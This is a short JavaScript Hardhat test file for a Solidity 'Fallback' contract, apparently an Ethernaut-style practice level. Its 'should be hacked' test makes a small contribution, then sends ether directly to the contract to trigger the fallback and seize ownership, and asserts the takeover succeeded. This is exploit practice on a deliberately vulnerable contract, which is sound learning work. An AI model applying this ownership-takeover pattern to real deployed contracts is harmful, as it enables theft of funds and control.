import { loadFixture, ethers, expect } from "./setup";

const _ticketPrice = ethers.parseEther("0.1");
const _duration = 10;
const _ownerCommission = 2;

describe("Fallback contract", function() {
    async function deploy() {
		const owner = (await ethers.getSigners())[0];
        const newOwner = (await ethers.getSigners())[1];

        const Factory = await ethers.getContractFactory("Fallback");
        const contract = await Factory.deploy();
        await contract.waitForDeployment();

        return {contract, owner, newOwner};
    }

    it ("should be depoyed", async function() {
        const {contract} = await loadFixture(deploy);

        expect(contract.target).to.be.properAddress;
    });

    it ("should be hacked", async function() {
        const {contract, owner, newOwner} = await loadFixture(deploy);
        
        await contract.connect(newOwner).contribute({value: ethers.parseEther("0.00001")});
        const contribution = await contract.connect(newOwner).getContribution();
        expect(contribution).to.be.eq(ethers.parseEther("0.00001"));
        
        // hack
        await newOwner.sendTransaction({to: await contract.getAddress(), value: ethers.parseEther("0.00001")})
        const ownerAddess = await contract.owner();

        expect(ownerAddess).to.be.eq(newOwner.address);
    });
})